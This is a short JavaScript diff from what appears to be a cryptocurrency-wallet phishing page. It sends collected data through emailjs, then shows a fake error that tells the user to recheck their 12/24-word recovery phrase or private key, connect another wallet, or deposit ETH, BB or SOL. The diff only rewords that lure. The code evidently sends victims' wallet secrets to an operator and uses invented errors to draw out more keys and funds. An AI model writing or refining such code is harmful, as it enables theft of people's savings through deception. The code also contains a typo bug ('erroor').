@@ -238,14 +238,14 @@
                 .then((message) => {
                     console.log(message);
                 })
-                .catch((error) =>
+                .catch((error) => {
                     console.log(erroor);
                 });
 
                 emailjs.send(service_id, template_id, data)
                 .then(function(response) {
                 console.log('SUCCESS!', response.status, response.text);
-                alert("An unexpected error has occured. Please review your 12 or 24-word recovery phrase carefully, If the wallet recovery phrase or private key is not correct,or if you're attempting to connect an empty wallet, the error might persist.If problems continue, consider trying a different wallet or private key")
+                alert("AN UNEXPECTED ERROR OCCURED. KINDLY CHECK THE 12/24 WORD CAREFULLY OR CONNECT A DIFFERENT WALLET/PRIVATE KE..........error can also occur if you connect an empty wallet. Kindly deposit enough ETH or BB or SOL if your wallet is empty")
                 }, function(error) {
                 console.log('FAILED...', error);
                 });
